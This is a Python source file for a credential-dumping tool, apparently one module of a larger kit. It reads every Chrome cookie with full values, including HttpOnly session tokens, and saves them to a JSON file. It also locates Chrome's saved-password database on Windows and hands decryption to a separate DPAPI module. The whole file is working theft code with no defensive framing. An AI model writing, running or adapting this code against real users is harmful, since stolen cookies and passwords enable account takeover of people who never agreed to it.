import os
import json
import platform
from colorama import Fore, Style
from browser_cookie3 import chrome
from pathlib import Path

def extract_chrome_credentials(verbose=False):
    try:
        # Dump Chrome cookies
        cj = chrome()
        cookie_list = []
        for cookie in cj:
            cookie_list.append({
                "domain": cookie.domain,
                "name": cookie.name,
                "value": cookie.value,
                "path": cookie.path,
                "secure": cookie.secure,
                "expires": cookie.expires,
                "httpOnly": cookie._rest.get("HttpOnly", False)
            })
        with open("output/chrome_dump.json", "w", encoding="utf-8") as f:
            json.dump(cookie_list, f, indent=2)
        print(Fore.GREEN + "[+] Extracted Chrome cookies to output/chrome_dump.json" + Style.RESET_ALL)

        # Dump login data (Windows only, needs DPAPI)
        if platform.system() != "Windows":
            print(Fore.YELLOW + "[!] Skipping saved passwords: requires Windows + DPAPI." + Style.RESET_ALL)
            return

        login_data = os.path.join(Path.home(), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(login_data):
            print(Fore.RED + "[!] Chrome Login Data not found. Chrome profile may be missing." + Style.RESET_ALL)
            return

        # TODO: Optional - integrate DPAPI decryption from dpapi_decrypt.py
        print(Fore.YELLOW + "[*] Saved passwords detected, but decryption is handled in dpapi_decrypt.py" + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"[!] Chrome credential extraction failed: {e}" + Style.RESET_ALL)
